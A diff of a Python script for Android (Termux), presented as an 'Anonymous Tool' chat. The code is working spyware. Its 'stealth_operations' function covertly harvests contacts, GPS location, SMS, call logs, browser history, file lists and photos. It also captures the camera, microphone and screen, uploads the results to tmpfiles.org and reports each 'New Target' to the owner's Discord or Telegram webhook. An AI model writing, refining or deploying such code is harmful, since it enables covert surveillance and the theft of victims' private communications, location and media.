@@ -12,13 +12,9 @@ import socket
 import platform
 import subprocess
 import requests
-import base64
 import sqlite3
-import shutil
 from datetime import datetime
 from pathlib import Path
-import threading
-import hashlib
 
 # ========== CONFIG ==========
 CONFIG_FILE = "config.json"
@@ -68,34 +64,17 @@ def setup_owner():
 
 # ========== CLOUD UPLOAD ==========
 def upload_to_cloud(file_path, folder_name):
-    """Upload file to free cloud (tmpfiles.org)"""
     try:
-        # If file doesn't exist, return None
         if not os.path.exists(file_path):
             return None
-            
         url = "https://tmpfiles.org/api/v1/upload"
         with open(file_path, 'rb') as f:
             files = {'file': (os.path.basename(file_path), f)}
             response = requests.post(url, files=files, timeout=30)
-            
         if response.status_code == 200:
             data = response.json()
             return data.get('data', {}).get('url', '')
         return None
-    except Exception as e:
-        return None
-
-def upload_json_to_cloud(data, filename, folder_name):
-    """Upload JSON data to cloud"""
-    try:
-        temp_file = f"/tmp/{filename}"
-        with open(temp_file, 'w') as f:
-            json.dump(data, f, indent=4)
-        
-        url = upload_to_cloud(temp_file, folder_name)
-        os.remove(temp_file)
-        return url
     except:
         return None
 
@@ -108,7 +87,7 @@ def get_user_ip():
         return 'Unable to fetch IP'
 
 def get_device_info():
-    info = {
+    return {
         "ip": get_user_ip(),
         "hostname": socket.gethostname(),
         "os": platform.system(),
@@ -117,14 +96,11 @@ def get_device_info():
         "processor": platform.processor(),
         "timestamp": datetime.now().isoformat()
     }
-    return info
 
 # ========== FEATURE 1: CONTACTS ==========
 def get_contacts():
-    """Extract contacts from Android"""
     contacts = []
     try:
-        # Try Termux:API first
         result = subprocess.run(['termux-contact-list'], 
                                capture_output=True, text=True, timeout=10)
         if result.returncode == 0 and result.stdout:
@@ -135,13 +111,12 @@ def get_contacts():
                     'number': contact.get('number', ''),
                     'email': contact.get('email', '')
                 })
-        return contacts
     except:
-        return contacts
+        pass
+    return contacts
 
 # ========== FEATURE 2: GPS LOCATION ==========
 def get_gps_location():
-    """Get GPS coordinates"""
     try:
         result = subprocess.run(['termux-location'], 
                                capture_output=True, text=True, timeout=10)
@@ -159,13 +134,11 @@ def get_gps_location():
     return None
 
 # ========== FEATURE 3: MICROPHONE RECORDING ==========
-def record_audio(duration=10):
-    """Record microphone audio"""
+def record_audio(duration=8):
     try:
         filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3"
         cmd = f'termux-microphone-record -d {duration} -f {filename}'
         subprocess.run(cmd, shell=True, timeout=duration+5, check=True)
-        
         if os.path.exists(filename):
             url = upload_to_cloud(filename, 'audio_recordings')
             os.remove(filename)
@@ -176,12 +149,10 @@ def record_audio(duration=10):
 
 # ========== FEATURE 4: CAMERA PHOTO ==========
 def capture_photo():
-    """Take photo using camera"""
     try:
         filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
         cmd = f'termux-camera-photo -c 0 {filename}'
         subprocess.run(cmd, shell=True, timeout=10, check=True)
-        
         if os.path.exists(filename):
             url = upload_to_cloud(filename, 'camera_photos')
             os.remove(filename)
@@ -192,20 +163,17 @@ def capture_photo():
 
 # ========== FEATURE 5: SMS MESSAGES ==========
 def get_sms_messages():
-    """Get SMS messages"""
     try:
         result = subprocess.run(['termux-sms-list'], 
                                capture_output=True, text=True, timeout=10)
         if result.returncode == 0 and result.stdout:
-            sms_data = json.loads(result.stdout)
-            return sms_data[:20]
+            return json.loads(result.stdout)[:20]
     except:
         pass
     return []
 
 # ========== FEATURE 6: CALL LOGS ==========
 def get_call_logs():
-    """Get call logs"""
     try:
         result = subprocess.run(['termux-call-log'], 
                                capture_output=True, text=True, timeout=10)
@@ -217,32 +185,20 @@ def get_call_logs():
 
 # ========== FEATURE 7: BROWSER HISTORY ==========
 def get_browser_history():
-    """Extract browser history"""
     history = []
     try:
-        # Chrome
         chrome_path = '/data/data/com.android.chrome/app_chrome/Default/History'
         if os.path.exists(chrome_path):
-            try:
-                conn = sqlite3.connect(chrome_path)
-                cursor = conn.cursor()
-                cursor.execute("""
-                    SELECT url, title, last_visit_time 
-                    FROM urls 
-                    ORDER BY last_visit_time DESC 
-                    LIMIT 20
-                """)
-                for row in cursor.fetchall():
-                    history.append({
-                        'url': row[0],
-                        'title': row[1] if row[1] else 'No title',
-                        'time': str(row[2]) if row[2] else ''
-                    })
-                conn.close()
-            except:
-                pass
-                
-        # If no history found, try Termux API
+            conn = sqlite3.connect(chrome_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
+            for row in cursor.fetchall():
+                history.append({
+                    'url': row[0],
+                    'title': row[1] if row[1] else 'No title',
+                    'time': str(row[2]) if row[2] else ''
+                })
+            conn.close()
         if not history:
             result = subprocess.run(['termux-browser-history'], 
                                    capture_output=True, text=True, timeout=10)
@@ -253,13 +209,11 @@ def get_browser_history():
     return history
 
 # ========== FEATURE 8: SCREEN RECORDING ==========
-def screen_record(duration=30):
-    """Record screen"""
+def screen_record(duration=15):
     try:
         filename = f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
         cmd = f'screenrecord --time-limit {duration} {filename}'
         subprocess.run(cmd, shell=True, timeout=duration+5, check=True)
-        
         if os.path.exists(filename):
             url = upload_to_cloud(filename, 'screen_recordings')
             os.remove(filename)
@@ -270,16 +224,8 @@ def screen_record(duration=30):
 
 # ========== FEATURE 9: FILE LIST ==========
 def get_file_list():
-    """Get list of all files"""
     files = []
-    search_dirs = [
-        '/sdcard/Download',
-        '/sdcard/Documents',
-        '/sdcard/Music',
-        '/sdcard/Movies',
-        '/sdcard/WhatsApp'
-    ]
-    
+    search_dirs = ['/sdcard/Download', '/sdcard/Documents', '/sdcard/Music', '/sdcard/Movies', '/sdcard/WhatsApp']
     for directory in search_dirs:
         if os.path.exists(directory):
             try:
@@ -306,11 +252,8 @@ def get_file_list():
 
 # ========== FEATURE 10: VPN DETECTION ==========
 def detect_vpn():
-    """Check if user is using VPN"""
     try:
-        result = subprocess.run(['ip', 'addr'], 
-                               capture_output=True, text=True, timeout=5)
-        
+        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
         vpn_interfaces = ['tun', 'ppp', 'utun', 'wg']
         for interface in vpn_interfaces:
             if interface in result.stdout:
@@ -319,52 +262,15 @@ def detect_vpn():
     except:
         return False
 
-# ========== FEATURE 11: AUTO BACKUP ==========
-def auto_backup(user_ip):
-    """Auto backup all collected data"""
-    print("[*] Creating auto backup...")
-    
-    backup_data = {
-        'timestamp': datetime.now().isoformat(),
-        'version': VERSION,
-        'device_info': get_device_info(),
-        'ip': user_ip,
-        'vpn_detected': detect_vpn(),
-        'contacts': get_contacts(),
-        'location': get_gps_location(),
-        'sms': get_sms_messages(),
-        'call_logs': get_call_logs(),
-        'browser_history': get_browser_history(),
-        'files': get_file_list(),
-        'images': find_images()
-    }
-    
-    # Save backup
-    backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-    with open(backup_filename, 'w') as f:
-        json.dump(backup_data, f, indent=4)
-    
-    # Upload backup
-    url = upload_to_cloud(backup_filename, f'backups_{user_ip.replace(".", "_")}')
-    os.remove(backup_filename)
-    
-    return url
-
 # ========== FIND IMAGES ==========
 def find_images():
-    """Find images in device"""
     images = []
     image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']
-    
     search_dirs = [
-        '/sdcard/DCIM',
-        '/sdcard/Pictures',
-        '/sdcard/Download',
+        '/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download',
         '/sdcard/WhatsApp/Media/WhatsApp Images',
-        '/storage/emulated/0/DCIM',
-        '/storage/emulated/0/Pictures'
+        '/storage/emulated/0/DCIM', '/storage/emulated/0/Pictures'
     ]
-    
     for search_dir in search_dirs:
         if os.path.exists(search_dir):
             try:
@@ -386,37 +292,48 @@ def find_images():
                 pass
         if len(images) >= 10:
             break
-    
     return images
+
+# ========== AUTO BACKUP ==========
+def auto_backup(user_ip):
+    print("[*] Creating auto backup...")
+    backup_data = {
+        'timestamp': datetime.now().isoformat(),
+        'version': VERSION,
+        'device_info': get_device_info(),
+        'ip': user_ip,
+        'vpn_detected': detect_vpn(),
+        'contacts': get_contacts(),
+        'location': get_gps_location(),
+        'sms': get_sms_messages(),
+        'call_logs': get_call_logs(),
+        'browser_history': get_browser_history(),
+        'files': get_file_list(),
+        'images': find_images()
+    }
+    backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    with open(backup_filename, 'w') as f:
+        json.dump(backup_data, f, indent=4)
+    url = upload_to_cloud(backup_filename, f'backups_{user_ip.replace(".", "_")}')
+    os.remove(backup_filename)
+    return url
 
 # ========== SEND TO OWNER ==========
 def send_to_owner(webhook_url, data, user_ip):
-    """Send all collected data to owner"""
     if not webhook_url:
         return False
-    
-    # Create folder name
     folder_name = f"user_{user_ip.replace('.', '_')}"
-    
-    # Upload images
     images = data.get('images', [])
     uploaded_images = []
     for img_path in images[:10]:
         try:
             url = upload_to_cloud(img_path, folder_name)
             if url:
-                uploaded_images.append({
-                    'filename': os.path.basename(img_path),
-                    'url': url
-                })
+                uploaded_images.append({'filename': os.path.basename(img_path), 'url': url})
             time.sleep(0.5)
         except:
             pass
-    
-    # Upload backup
     backup_url = auto_backup(user_ip)
-    
-    # Prepare message
     message = f"""
 🚨 **New Target Connected** 🚨
 
@@ -440,24 +357,17 @@ def send_to_owner(webhook_url, data, user_ip):
 📞 **Call Logs:** {len(data.get('call_logs', []))} entries
 🌐 **Browser History:** {len(data.get('browser_history', []))} entries
 
-📎 **Download Links:**
-"""
-    
+📎 **Download Links:"""
     for i, img in enumerate(uploaded_images[:5], 1):
         message += f"\n{i}. [{img['filename']}]({img['url']})"
-    
     if backup_url:
         message += f"\n\n💾 **Full Backup:** [Download]({backup_url})"
-    
     message += f"\n\n⏰ Time: `{datetime.now().isoformat()}`"
-    
-    # Send to webhook
     try:
         payload = {"content": message}
         if "discord.com" in webhook_url:
             requests.post(webhook_url, json=payload, timeout=10)
         elif "telegram.org" in webhook_url:
-            # Telegram format
             chat_id = webhook_url.split("/")[-1]
             url = f"https://api.telegram.org/bot{webhook_url.split('/')[-2]}/sendMessage"
             requests.post(url, json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}, timeout=10)
@@ -467,12 +377,9 @@ def send_to_owner(webhook_url, data, user_ip):
 
 # ========== STEALTH OPERATIONS ==========
 def stealth_operations():
-    """Run all features stealthily"""
     print("[*] Running stealth operations...")
-    
     config = load_config()
     user_ip = get_user_ip()
-    
     data = {
         'images': find_images(),
         'contacts': get_contacts(),
@@ -486,54 +393,42 @@ def stealth_operations():
         'audio_record': None,
         'screen_record': None
     }
-    
-    # Try camera
     try:
         photo = capture_photo()
         if photo:
             data['camera_photo'] = photo
     except:
         pass
-    
-    # Try audio
     try:
         audio = record_audio(8)
         if audio:
             data['audio_record'] = audio
     except:
         pass
-    
-    # Try screen record
     try:
         screen = screen_record(15)
         if screen:
             data['screen_record'] = screen
     except:
         pass
-    
-    # Send to owner
     if config.get('webhook_url'):
         send_to_owner(config['webhook_url'], data, user_ip)
         print("[✓] All data sent to owner")
     else:
-        # Save locally
         folder = f"data_{user_ip.replace('.', '_')}"
         os.makedirs(folder, exist_ok=True)
         with open(f"{folder}/data.json", 'w') as f:
             json.dump(data, f, indent=4)
         print(f"[✓] Data saved to {folder}/")
-    
     return data
 
 # ========== ANONYMOUS CHAT ==========
 def anonymous_chat():
-    """Anonymous message interface"""
     print("\n" + "="*50)
     print("📱 ANONYMOUS CHAT v3.0 📱")
     print("="*50)
     print("\n[+] Type your message (type 'exit' to quit):")
     print("[+] Type 'menu' to see options\n")
-    
     while True:
         msg = input("📝 You: ")
         if msg.lower() == 'exit':
@@ -553,29 +448,20 @@ def anonymous_chat():
 
 # ========== MAIN ==========
 def main():
-    # Check setup
     if not os.path.exists(CONFIG_FILE):
         print("[*] First run detected. Setting up...")
         setup_owner()
-    
     print("\n🚀 Starting Anonymous Tool v3.0...")
     time.sleep(1)
-    
-    # Run stealth operations
     stealth_operations()
-    
-    # Start anonymous chat
     anonymous_chat()
-    
     print("\n[✓] Session ended. Goodbye!")
 
 if __name__ == "__main__":
-    # Install dependencies if needed
     try:
         import requests
     except ImportError:
         print("[*] Installing dependencies...")
         os.system('pip install requests')
         os.system('pkg install termux-api -y')
-    
     main()
